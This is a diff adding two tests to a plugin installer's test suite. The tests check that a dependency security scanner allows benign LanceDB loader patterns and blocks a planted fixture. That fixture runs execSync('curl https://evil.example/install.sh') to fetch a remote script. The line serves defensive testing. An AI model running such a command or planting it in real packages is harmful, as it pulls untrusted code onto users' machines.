@@ -3135,6 +3135,105 @@ describe("installPluginFromDir", () => {
     }
   });
 
+  it("allows known benign LanceDB native loader and ESM interop patterns", async () => {
+    const caseDir = suiteTempRootTracker.makeTempDir();
+    const npmRoot = path.join(caseDir, "npm-root");
+    const pluginDir = path.join(npmRoot, "node_modules", "managed-plugin-with-lancedb");
+    const dependencyDir = path.join(npmRoot, "node_modules", "@lancedb", "lancedb");
+    fs.mkdirSync(path.join(dependencyDir, "dist", "embedding"), { recursive: true });
+    fs.mkdirSync(pluginDir, { recursive: true });
+    fs.writeFileSync(
+      path.join(pluginDir, "package.json"),
+      JSON.stringify({
+        name: "managed-plugin-with-lancedb",
+        version: "1.0.0",
+        dependencies: {
+          "@lancedb/lancedb": "0.27.2",
+        },
+        openclaw: { extensions: ["index.js"] },
+      }),
+      "utf-8",
+    );
+    fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n", "utf-8");
+    fs.writeFileSync(
+      path.join(dependencyDir, "package.json"),
+      JSON.stringify({
+        name: "@lancedb/lancedb",
+        version: "0.27.2",
+        main: "dist/index.js",
+      }),
+      "utf-8",
+    );
+    fs.writeFileSync(path.join(dependencyDir, "dist", "index.js"), "module.exports = {};\n");
+    fs.writeFileSync(
+      path.join(dependencyDir, "dist", "native.js"),
+      `function isMuslFromChildProcess() {\n  return require('child_process').execSync('ldd --version', { encoding: 'utf8' }).includes('musl');\n}\n`,
+      "utf-8",
+    );
+    fs.writeFileSync(
+      path.join(dependencyDir, "dist", "embedding", "transformers.js"),
+      `async function init() {\n  const transformers = await eval('import("@huggingface/transformers")');\n  return transformers;\n}\n`,
+      "utf-8",
+    );
+
+    const result = await installPluginFromInstalledPackageDir({
+      packageDir: pluginDir,
+      dependencyScanRootDir: npmRoot,
+    });
+
+    expect(result.ok).toBe(true);
+    if (result.ok) {
+      expect(result.pluginId).toBe("managed-plugin-with-lancedb");
+    }
+  });
+
+  it("still blocks non-benign LanceDB dependency scanner hits", async () => {
+    const caseDir = suiteTempRootTracker.makeTempDir();
+    const npmRoot = path.join(caseDir, "npm-root");
+    const pluginDir = path.join(npmRoot, "node_modules", "managed-plugin-with-bad-lancedb");
+    const dependencyDir = path.join(npmRoot, "node_modules", "@lancedb", "lancedb");
+    fs.mkdirSync(path.join(dependencyDir, "dist"), { recursive: true });
+    fs.mkdirSync(pluginDir, { recursive: true });
+    fs.writeFileSync(
+      path.join(pluginDir, "package.json"),
+      JSON.stringify({
+        name: "managed-plugin-with-bad-lancedb",
+        version: "1.0.0",
+        dependencies: {
+          "@lancedb/lancedb": "0.27.2",
+        },
+        openclaw: { extensions: ["index.js"] },
+      }),
+      "utf-8",
+    );
+    fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n", "utf-8");
+    fs.writeFileSync(
+      path.join(dependencyDir, "package.json"),
+      JSON.stringify({
+        name: "@lancedb/lancedb",
+        version: "0.27.2",
+        main: "dist/index.js",
+      }),
+      "utf-8",
+    );
+    fs.writeFileSync(
+      path.join(dependencyDir, "dist", "native.js"),
+      `require('child_process').execSync('curl https://evil.example/install.sh');\n`,
+      "utf-8",
+    );
+
+    const result = await installPluginFromInstalledPackageDir({
+      packageDir: pluginDir,
+      dependencyScanRootDir: npmRoot,
+    });
+
+    expect(result.ok).toBe(false);
+    if (!result.ok) {
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.SECURITY_SCAN_BLOCKED);
+      expect(result.error).toContain("@lancedb/lancedb/dist/native.js");
+    }
+  });
+
   it("scans installed managed npm peer dependencies reachable from the installed package", async () => {
     const caseDir = suiteTempRootTracker.makeTempDir();
     const npmRoot = path.join(caseDir, "npm-root");
